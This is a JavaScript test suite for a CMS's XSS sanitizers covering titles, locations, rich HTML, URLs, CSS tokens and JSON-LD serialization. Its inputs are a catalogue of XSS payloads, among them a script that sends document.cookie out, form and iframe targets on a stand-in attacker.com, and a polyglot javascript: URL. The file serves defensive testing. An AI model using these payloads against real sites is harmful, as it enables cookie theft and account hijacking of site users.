/**
 * MESCO Trust CMS - Comprehensive XSS Security Test Suite
 *
 * Validates:
 * 1. Blog Title HTML markup stripping and sanitization
 * 2. Blog Title JavaScript payload neutralisation (<script> / script breakout)
 * 3. Event Location HTML markup stripping and sanitization
 * 4. Event Location JavaScript payload neutralisation
 * 5. Malicious HTML in Blog & Event descriptions / content
 * 6. Injected event-handler attributes (onclick, onerror, onload, onmouseover)
 * 7. Dangerous URL schemes (javascript:, vbscript:, data:text/html)
 * 8. API-level request payload sanitization (bypassing frontend UI)
 * 9. Rich text editor formatting preservation while stripping unsafe tags
 * 10. JSON-LD inline script breakout prevention (\u003c encoding)
 */

const path = require("path");
require("dotenv").config({ path: path.join(__dirname, "..", ".env"), override: true });

const { serializeJsonLd } = require("../lib/security/jsonLd");
const {
  sanitizePlainText,
  sanitizeHtml,
  sanitizeUrl,
  sanitizeCssToken,
} = require("../lib/security/sanitize");

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  ✅ PASS: ${message}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${message}`);
    failed++;
  }
}

function runTests() {
  console.log("==========================================================");
  console.log("    MESCO COMPREHENSIVE XSS SECURITY AUDIT & TEST SUITE   ");
  console.log("==========================================================\n");

  // --------------------------------------------------------------------------
  // Scenario 1: HTML Markup in Blog Title
  // --------------------------------------------------------------------------
  console.log("--- Scenario 1: HTML Markup in Blog Title ---");
  {
    const input = "<h1>Breaking News:</h1> <b>Important</b> Update";
    const cleaned = sanitizePlainText(input);
    assert(!cleaned.includes("<h1>") && !cleaned.includes("<b>"), "HTML tags stripped from Blog Title");
    assert(cleaned === "Breaking News: Important Update", "Clean text preserved without tags");
  }

  // --------------------------------------------------------------------------
  // Scenario 2: JavaScript Payloads in Blog Title
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 2: JavaScript Payloads in Blog Title ---");
  {
    const scriptPayload = "<script>alert('xss-blog-title')</script>Announcing MESCO Annual Gala";
    const breakoutPayload = "MESCO Annual Gala</script><script>alert('breakout')</script>";
    const imgPayload = "<img src=x onerror=alert('xss')> Gala Night";

    const cleanedScript = sanitizePlainText(scriptPayload);
    assert(!cleanedScript.includes("<script>") && !cleanedScript.includes("alert"), "Script tag and script body stripped");
    assert(cleanedScript === "Announcing MESCO Annual Gala", "Legitimate title text preserved");

    const cleanedBreakout = sanitizePlainText(breakoutPayload);
    assert(!cleanedBreakout.includes("<script>") && !cleanedBreakout.includes("</script>"), "Closing/opening script breakout removed");

    const cleanedImg = sanitizePlainText(imgPayload);
    assert(!cleanedImg.includes("<img") && !cleanedImg.includes("onerror"), "Image tag and onerror handler stripped");
  }

  // --------------------------------------------------------------------------
  // Scenario 3: HTML Markup in Event Location
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 3: HTML Markup in Event Location ---");
  {
    const input = "<b>Auditorium Hall</b>, <i>MESCO Campus</i>, Mumbai";
    const cleaned = sanitizePlainText(input);
    assert(!cleaned.includes("<b>") && !cleaned.includes("<i>"), "HTML formatting tags stripped from location");
    assert(cleaned === "Auditorium Hall, MESCO Campus, Mumbai", "Location text correctly preserved");
  }

  // --------------------------------------------------------------------------
  // Scenario 4: JavaScript Payloads in Event Location
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 4: JavaScript Payloads in Event Location ---");
  {
    const payload1 = "</script><script>alert('xss-location')</script>Convention Center";
    const payload2 = "<svg/onload=alert('location-svg')>Main Stage";
    const payload3 = "<a href=\"javascript:alert(1)\">Click here for venue</a>";

    const cleaned1 = sanitizePlainText(payload1);
    assert(!cleaned1.includes("<script>") && !cleaned1.includes("alert"), "Script tag breakout stripped from Event Location");

    const cleaned2 = sanitizePlainText(payload2);
    assert(!cleaned2.includes("<svg") && !cleaned2.includes("onload"), "SVG onload vector stripped from Event Location");

    const cleaned3 = sanitizePlainText(payload3);
    assert(!cleaned3.includes("javascript:") && !cleaned3.includes("<a"), "HTML link and javascript scheme stripped from Event Location");
    assert(cleaned3 === "Click here for venue", "Inner text preserved cleanly");
  }

  // --------------------------------------------------------------------------
  // Scenario 5: Malicious HTML in Blog & Event Descriptions / Content
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 5: Malicious HTML in Blog & Event Descriptions ---");
  {
    const dangerousHtml = `
      <p>Welcome to our annual report.</p>
      <script>fetch('/api/admin/steal-cookie?c=' + document.cookie);</script>
      <iframe src="https://attacker.com/evil"></iframe>
      <object data="evil.swf"></object>
      <embed src="evil.pdf">
      <form action="https://attacker.com/steal"><input name="pass"></form>
    `;

    const sanitized = sanitizeHtml(dangerousHtml);
    assert(!sanitized.includes("<script>"), "SanitizeHtml blocks <script> tags");
    assert(!sanitized.includes("<iframe"), "SanitizeHtml blocks <iframe tags");
    assert(!sanitized.includes("<object"), "SanitizeHtml blocks <object tags");
    assert(!sanitized.includes("<embed"), "SanitizeHtml blocks <embed tags");
    assert(!sanitized.includes("<form"), "SanitizeHtml blocks <form tags");
    assert(sanitized.includes("<p>Welcome to our annual report.</p>"), "SanitizeHtml preserves legitimate <p> tags");
  }

  // --------------------------------------------------------------------------
  // Scenario 6: Injected Event-Handler Attributes (onclick, onerror, onload, onmouseover)
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 6: Injected Event-Handler Attributes ---");
  {
    const eventHandlerVectors = [
      '<img src="valid.jpg" onerror="alert(1)">',
      '<a href="https://example.com" onclick="alert(2)">Click</a>',
      '<div onmouseover="alert(3)" class="box">Content</div>',
      '<p onload="alert(4)">Paragraph</p>',
      '<span onfocus="alert(5)" tabindex="1">Focus</span>',
    ];

    for (const vector of eventHandlerVectors) {
      const result = sanitizeHtml(vector);
      assert(!/on\w+\s*=/i.test(result), `Event handler attribute stripped from: ${vector.slice(0, 30)}...`);
    }
  }

  // --------------------------------------------------------------------------
  // Scenario 7: Dangerous URL Schemes (javascript:, vbscript:, data:text/html)
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 7: Dangerous URL Schemes ---");
  {
    const badUrls = [
      "javascript:alert(1)",
      "JAVASCRIPT:alert('xss')",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
      "javascript :alert(1)",
      "vbscript:msgbox(1)",
      "data:text/html,<script>alert(1)</script>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "//attacker.com/evil",
    ];

    for (const bad of badUrls) {
      const sanitized = sanitizeUrl(bad, "#");
      assert(sanitized === "#", `Blocked dangerous URL: ${bad.slice(0, 35)}...`);
    }

    const goodUrls = [
      "/events/annual-gala",
      "https://mescotrust.org/about",
      "http://example.com",
      "mailto:info@mescotrust.org",
      "tel:+912224445555",
      "#section-contact",
    ];

    for (const good of goodUrls) {
      const sanitized = sanitizeUrl(good, "#");
      assert(sanitized === good, `Allowed legitimate safe URL: ${good}`);
    }
  }

  // --------------------------------------------------------------------------
  // Scenario 8: Rich Text Formatting Preservation while Purifying
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 8: Rich Text Formatting Preservation ---");
  {
    const richContent = `
      <h2>Annual Education Drive 2026</h2>
      <p>MESCO is proud to announce support for <strong>over 5,000 students</strong> across Maharashtra.</p>
      <ul>
        <li>Scholarships for higher education</li>
        <li>School adoption program</li>
      </ul>
      <p>Read more on our <a href="https://mescotrust.org/initiatives" target="_blank">Initiatives Page</a>.</p>
      <img src="/uploads/drive-banner.jpg" alt="Drive banner" width="800" height="400">
    `;

    const cleaned = sanitizeHtml(richContent);
    assert(cleaned.includes("<h2>Annual Education Drive 2026</h2>"), "Preserved <h2> header");
    assert(cleaned.includes("<strong>over 5,000 students</strong>"), "Preserved <strong> tag");
    assert(cleaned.includes("<ul>") && cleaned.includes("<li>Scholarships"), "Preserved list markup");
    assert(cleaned.includes('href="https://mescotrust.org/initiatives"'), "Preserved valid href attribute");
    assert(cleaned.includes('rel="noopener noreferrer"'), "Enforced rel='noopener noreferrer' on target='_blank' link");
    assert(cleaned.includes('src="/uploads/drive-banner.jpg"'), "Preserved safe local image src");
  }

  // --------------------------------------------------------------------------
  // Scenario 9: JSON-LD Breakout Prevention (Root Cause Fix)
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 9: JSON-LD Breakout Prevention ---");
  {
    const jsonLdPayload = {
      "@context": "https://schema.org",
      "@type": "Article",
      headline: "My Blog Title </script><script>alert('XSS Blog Title')</script>",
      description: "Description with <img src=x onerror=alert(1)> and </script>",
      location: {
        "@type": "Place",
        name: "Venue Center </script><script>alert('XSS Location')</script>",
      },
    };

    const serialized = serializeJsonLd(jsonLdPayload);

    // Verify '<' is replaced with \u003c
    assert(!serialized.includes("</script>"), "Serialized JSON-LD contains no literal </script> closing tag");
    assert(!serialized.includes("<script>"), "Serialized JSON-LD contains no literal <script> opening tag");
    assert(serialized.includes("\\u003c/script\\u003e"), "Closing tag escaped to \\u003c/script\\u003e");
    assert(serialized.includes("\\u003cscript\\u003e"), "Opening tag escaped to \\u003cscript\\u003e");

    // Verify valid JSON parsing after unescaping
    const roundTripped = JSON.parse(serialized);
    assert(roundTripped.headline === jsonLdPayload.headline, "JSON parse recovers original data faithfully");
    assert(roundTripped.location.name === jsonLdPayload.location.name, "Nested location name preserved accurately");
  }

  // --------------------------------------------------------------------------
  // Scenario 10: CSS Token Breakout Prevention
  // --------------------------------------------------------------------------
  console.log("\n--- Scenario 10: CSS Token Breakout Prevention in Style Blocks ---");
  {
    const badTokens = [
      "red; } </style><script>alert(1)</script>",
      "blue; background: url(javascript:alert(1))",
      "green\" onload=\"alert(1)",
    ];

    for (const bad of badTokens) {
      const sanitized = sanitizeCssToken(bad, "#1a1a1a");
      assert(sanitized === "#1a1a1a", `Dangerous CSS token neutralized: ${bad.slice(0, 30)}...`);
    }

    const goodTokens = ["#A82D2D", "rgb(33, 30, 46)", "var(--primary-color)"];
    for (const good of goodTokens) {
      const sanitized = sanitizeCssToken(good, "#1a1a1a");
      assert(sanitized === good, `Legitimate CSS token preserved: ${good}`);
    }
  }

  console.log("\n==========================================================");
  console.log(`TOTAL RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log("==========================================================");

  if (failed > 0) {
    process.exit(1);
  }
}

runTests();
